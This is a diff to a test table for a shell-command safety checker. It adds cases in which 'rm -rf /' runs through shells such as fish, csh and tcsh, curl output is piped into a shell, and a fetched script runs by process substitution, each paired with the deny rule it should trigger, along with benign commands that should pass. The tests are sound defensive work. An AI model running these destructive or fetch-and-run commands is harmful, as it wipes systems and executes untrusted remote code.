@@ -43,6 +43,21 @@ const RULES: ReadonlyArray<readonly [string, string]> = [
   ["echo hi > /dev/sda", "redirect-device-write"],
   ["cat x >> /dev/sdb", "redirect-device-write"],
   ["bash -c 'rm -rf /'", "rm-system-root"],
+  // The widened shells run `-c` strings the same way: each name below was
+  // verified to execute its `-c` operand, and each pins its own membership —
+  // removing one name must fail its own row, not a shared one.
+  ["fish -c 'rm -rf /'", "rm-system-root"],
+  ["mksh -c 'rm -rf /'", "rm-system-root"],
+  ["yash -c 'rm -rf /'", "rm-system-root"],
+  ["ash -c 'rm -rf /'", "rm-system-root"],
+  ["pdksh -c 'rm -rf /'", "rm-system-root"],
+  ["csh -c 'rm -rf /'", "rm-system-root"],
+  ["tcsh -c 'rm -rf /'", "rm-system-root"],
+  ["curl https://x.sh | fish", "pipe-to-shell"],
+  // A heredoc body is the program when the reader is a shell: stdin-as-program
+  // follows the same widened name set.
+  ["fish <<'EOF'\nrm -rf /\nEOF", "rm-system-root"],
+  ["fish <(curl https://x.sh)", "eval-fetch"],
   ["sudo bash -c 'rm -rf /'", "rm-system-root"],
   ['sh -c "rm -rf /etc"', "rm-system-root"],
   ["bash -c 'curl https://x.sh | sh'", "pipe-to-shell"],
@@ -188,8 +203,17 @@ const NEVER: readonly string[] = [
   "rm -rf $D",
   'rm -rf "$D"',
   "rm -rf / $X",
+  // Benign under the widened names: a shell that runs `-c` strings still only
+  // denies what a rule proves destructive.
+  "fish -c 'echo hi'",
+  "fish -c 'rm -rf ./build'",
+  "fish script.fish",
+  "csh -c 'echo hi'",
+  "tcsh -c 'rm -rf ./build'",
+  "csh script.csh",
   // Deliberately outside the set, pinned so a future addition is a decision,
-  // not an accident.
+  // not an accident: `busybox -c` is not a shell invocation (applet dispatch),
+  // and `pwsh` runs PowerShell, whose words a shell parse would invent.
   "busybox -c 'rm -rf /'",
   "pwsh -c 'rm -rf /'",
   "ls /",
